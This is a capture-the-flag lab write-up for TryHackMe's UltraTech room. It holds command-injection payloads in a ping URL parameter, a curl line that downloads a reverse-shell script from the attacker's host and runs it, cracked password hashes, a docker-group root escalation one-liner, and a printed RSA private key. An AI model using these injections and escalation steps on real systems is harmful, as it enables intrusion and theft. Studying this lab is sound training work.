# Tryhackme.com Room : UltraTech

`https://tryhackme.com/room/ultratech1`



## Instance

```
export IP='10.10.141.73'
```

## Nmap

```
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```



## Initial foothold

Looking at `:8081/` we simply get

```
UltraTech API v0.1.3
```

We `gobuster` the website and find 

```
/auth
```

Which gives us:

```
You must specify a login and a password
```

We can try to login using `get` parameters :

````
/auth?login=admin&password=admin
````

Obviously without success.



We take a look at the `ftp` server on port `21`.

We try `anonymous` login but it doesn't work.

Let's scan all ports on the machine.

This was taking quite a long time, I've found a way to speedup the port scan.

Although it must be noted that it make the scan much easier to detect in real life and that it might give false positives.

```
nmap --min-rate 4500 --max-rtt-timeout 1500ms -p- -v 10.10.141.73
```

We find the port `31331` which we analyse further with :

```
nmap -sC -sV -p 31331 -v 10.10.141.73
```

```
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 15C1B7515662078EF4B5C724E2927A96
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
```

So this is another website.

We `gobuster` it and find :

```
/partners.html (Status: 200)
/images (Status: 301)
/index.html (Status: 200)
/css (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/what.html (Status: 200)
/robots.txt (Status: 200)
```

`/robots.txt` contains :

```
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

and `utech_sitemap.txt` contains :

```
/
/index.html
/what.html
/partners.html
```

Nothing new here

`/partners.html` show a login form which do a call on `:8081/auth` to try to connect.

Looking at the javascript in the page, we find an interesting method which call

```
:8081/ping?ip=${window.location.hostname}
```

Interesting, maybe we can inject some commands in there ?

We can ping ouselves with `:8081/ping?ip=10.6.32.20`

We get this response :

```
PING 10.6.32.20 (10.6.32.20) 56(84) bytes of data. 64 bytes from 10.6.32.20: icmp_seq=1 ttl=61 time=92.7 ms --- 10.6.32.20 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 92.746/92.746/92.746/0.000 ms 
```

Which hint that this is running the `ping` shell commands.

We can get shell execution using 

```
:8081/ping?ip=`curl http://10.6.32.20:8000`
```

Time to get a reverse shell.

Seems like some like some characters are replaced/escaped.

The easiest way to get a shell is just to create a script and `curl` it from the box

```
:8081/ping?ip=`curl http://10.6.32.20:8000/rev2.sh > /tmp/rev2.sh`
```

Then

```
:8081/ping?ip=`sh /tmp/rev2.sh`
```

And we got a shell as `www`



We find an `sqlite` database in `/home/www/api/utech.db.sqlite`

We retrieve it and we find a table `users` with :

```
admin:0d0ea5111e3c1def594c1684e3b9be84
r00t:f357a0c52799563c7c7b76c1e7543a32
```

These are actually `md5` hash as we can see by looking at the code in `/home/www/api/index.js`

We simply enter the hashes on `crackstation.net` and find

```
admin:mrsheafy
r00t:n100906
```

We also see in `index.js` that if we enter the correct creds we will get :

```
Restricted area

Hey r00t, can you please have a look at the server's configuration?
The intern did it and I don't really trust him.
Thanks!

lp1
```

But let's try to `su` to `r00t` using these creds.

And yep, we are now `r00t` 

Let's look around.

I did poke around a bit but didn't find anything useful. Then I ran `linpeas` and it quickly found that we were member of the `docker` group and `var/run/docker.sock` is writable.

Then from `gtfobin` we find that we can get a shell using 

```
docker run -v /:/mnt --rm -it {IMAGE_NAME} chroot /mnt sh
```

We can list available docker images with `docker images` and we find that there is an image named `bash`



Oh well, seems like it crashed the box... not sure what happened. Can't connect via ssh anymore and the webserver is not responding.

I restarted the machine and it froze the box again...

I restarted again. Looking at the resources with `htop` we see that the resources are pretty tight. There is no swap files and the ram usage is close to 100%.

This time I used the exploit to get a shell as `www` then I killed the `node` process and was able to get `root` using

```
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```



The challenge ask for the 9 first characters of the `root` private key.

Here is the `/root/.ssh/id_pub`

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
-----END RSA PRIVATE KEY-----
```



The first 9 characters are :

```
MIIEogIBA
```



## Wrap up

* This was a pretty easy box, except for the part where it was super tight on ressource and it would crash when I run the docker exploit..
* Not sure if it's really because I killed the node process or just vbecause I waited for the box to stabilize (If you start the box, login into it and run `htop`, the mem usage is even higher, it goes down a little after a couple of mins)